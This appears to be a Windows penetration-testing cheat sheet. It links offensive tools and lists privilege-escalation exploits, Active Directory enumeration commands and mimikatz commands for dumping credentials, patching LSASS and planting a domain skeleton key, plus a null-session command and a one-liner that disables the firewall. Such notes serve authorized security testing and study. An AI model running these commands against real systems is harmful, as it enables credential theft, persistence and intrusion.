# WINDOWS

* [PowerSploit](https://github.com/PowerShellMafia/PowerSploit) - collection of powershell modules for pentesting
* [Nishang](https://github.com/samratashok/nishang) - Powershell framework and collection of scripts and payloads for pentesting
* [USBDumper](http://www.secuobs.com/USBDumper.rar) - silently copies contents of every connected USB device to the system
* [CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec) - a swiss army knife for pentesting Windows/Active Directory environments
* [Kon-Boot](http://www.piotrbania.com/all/kon-boot/) - silently bypass the authentication process of Windows based OS

Privilege Escalation
====================

* [Windows Privilege Escalation Fundamentals](http://www.fuzzysecurity.com/tutorials/16.html)
* [Potato](https://github.com/foxglovesec/Potato) - privilege escalation on Windos 7, 8, 10, Server 2008, Server 2012
* [AccessEnum](https://technet.microsoft.com/en-us/sysinternals/bb897332.aspx) - tool for analyzing files/dirs user rights
* [Autoruns](http://technet.microsoft.com/en-us/sysinternals/bb963902.aspx ) - tool for managing autorun apps
* [AccessChk](https://technet.microsoft.com/en-us/sysinternals/bb664922.aspx)
* [PowerUp](https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc) - clearinghouse of common Windows privesc vectors that rely on misconfigurations  

A few useful Windows commands:  

`whoami /groups` shows info about which groups you are in, which integrity level your process is run at  
`systeminfo`  
`net user [username]`  
`schtasks /query /fo LIST /v` - list all scheduled tasks  
`tasklist /SVC` - link running processes to started services  
`wmic qfe get Caption,Description,HotFixID,InstalledOn` - view installed patches

Privilege escalation exploits:

* KiTrap0D (KB979682)
* MS11-011 (KB2393802)
* MS10-059 (KB982799)
* MS10-021 (KB979683)
* MS11-080 (KB2592799)

Other tips:

* Search for automated deployment tools config files - they may contain passwords: sysprep.inf, sysprep.xml, unattended.xml, groups.xml (Microsoft public AES key), etc.


Post-Exploitation
=================

* [Post-Exploitation with "Incognito"](http://hardsec.net/post-exploitation-with-incognito/?lang=en)
* [PowerShellEmpire](https://github.com/powershellempire/empire) - post-exploitation agent  

If have DC access, use CrackMapExe module to extract ntds.dit (contains AD data) and other modules.  

* [mimikatz](https://github.com/gentilkiwi/mimikatz) - extract plaintext passwords, hashes, PIN codes, kerberos tickets from memory; pass-the-hash. Useful commands:  

`privilege::debug`  
`sekurlsa::LogonPasswords full`  
`!lsadum::cache` - dump cached credentials  
`!lsadump:sam` - dump local user account password hashes  
`misc::cmd` - re-enable command shell, if disabled in registry  
`!misc::memssp` - patch LSASS to log credentials after authentication; see: c:\windows\system32\mimilsa.log  
`misc::skeleton` - (for DCs only) patch LSASS to make "mimikatz" password work for all users on the domain  
`process::suspend [pid]` - suspend a process  
`process::resume [pid]` - resume execution of a progress  


Extracting Hashes
-----------------

Tools: `fgdump.exe` or `pwdump`  
WCE (windows credential editor) - might work for older versions: `wce -w`  


Useful Windows Commands
-----------------------

`net view /DOMAIN` - find out which domain I trust  
`net view /DOMAIN:[domain]  
net group "domain computers" /DOMAIN` - see which hosts are in a domain  
`nltest /dclist:[domain]` - see which hosts are DCs for a domain  
`nslookup [name]  
ping -n 1 -4 [name]` - map a NetBIOS name to an IPv4 addresses  
`nltest /domain_trusts  
nltest /server:[address] /domain_trusts` - map domain trusts  
`net view \\[name]` - list shares on a host  
`net group "enterprise admins" /DOMAIN` - show ent admins  
`net group "domain admins" /DOMAIN` - show domain admins  
`net localgroup "administrators" /DOMAIN` - show local admins  

Null Session
------------

Open ports? UDP 137 & 138, TCP 139  
`net use \\host\IPC$ "" "/user:"`


Other
=====

Turn off firewall: `NetSh Advfirewall set allprofiles state off`  
* [ntpassword](http://pogostick.net/~pnh/ntpasswd/) - utility to reset Windows passwords
